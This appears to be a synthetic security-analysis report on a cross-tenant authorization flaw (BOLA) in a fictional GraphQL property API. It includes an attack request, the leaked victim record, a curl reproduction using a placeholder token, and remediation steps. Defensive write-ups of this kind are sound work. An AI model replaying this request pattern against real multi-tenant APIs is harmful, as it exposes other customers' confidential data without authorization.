# Security Analysis Report
**System:** EstateFlow Property API
**Domain:** Real Estate / PropTech
**Example ID:** GQL-0267
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | HIGH | BOLA — Pattern 1.3 | Bulk or list endpoints on `getResource` / `listResources` — attacker reads property records belonging to another tenant |

---

## Finding 1 — BOLA: Bulk/List Endpoint Without Tenant Isolation (Pattern 1.3)

### Summary
The GraphQL API at `https://api.estateflow-property-.example.com/graphql` exposes a `getResource` resolver (and `listResources`) that fetches by `resourceId` without verifying the JWT `tenantId` claim matches the object's `tenantId`. Per RISK-GQL-267, the `listResources` resolver returns all objects when `tenantId` filter is omitted or when the client-supplied value is not validated against the JWT claim. The Redis cache is keyed only by `resourceId` (no user dimension).

**Note:** `x-request-id: req-0963650d` is a server-assigned response header; it does not appear in the outgoing request. The HAR request and response both use `getResource` — no inconsistency in operation name.

**Note on hostname:** Hostname in context.txt is `api.estateflow-property-.example.com` (trailing dash before `.example.com`) — this is reproduced exactly as it appears in context.txt.

**Pattern:** 1.3 — Bulk or list endpoints (BOLA)
**Affected endpoint:** `POST https://api.estateflow-property-.example.com/graphql`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://api.estateflow-property-.example.com/graphql
Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG
Content-Type: application/json

{"query":"query VulnerableOp { getResource(id: \"R-2267\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}
```

**Response — Victim Property Record**
```json
{
  "data": {
    "getResource": {
      "tenantId": "tenant-650d",
      "ownerId": "other-user-0963650d",
      "data": {
        "sensitiveField": "CONFIDENTIAL-0963650d",
        "internalNotes": "Internal data exposed"
      }
    }
  }
}
```

### Steps to Reproduce
```bash
TOKEN="eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG"
curl -s -X POST "https://api.estateflow-property-.example.com/graphql" \
  -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"query":"query VulnerableOp { getResource(id: \"R-2267\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
# Vulnerable: tenantId: tenant-650d, sensitiveField: CONFIDENTIAL-0963650d
# Secure: {"errors":[{"message":"Forbidden"}]}
```

### Remediation
1. Resolver must compare `object.tenantId` against `jwt.tenantId` claim before returning data.
2. Redis cache key must include user/tenant dimension: `resource:{tenantId}:{resourceId}`.
3. `listResources` must inject `tenantId` from JWT server-side — do not accept client-supplied `tenantId` filter without JWT validation.
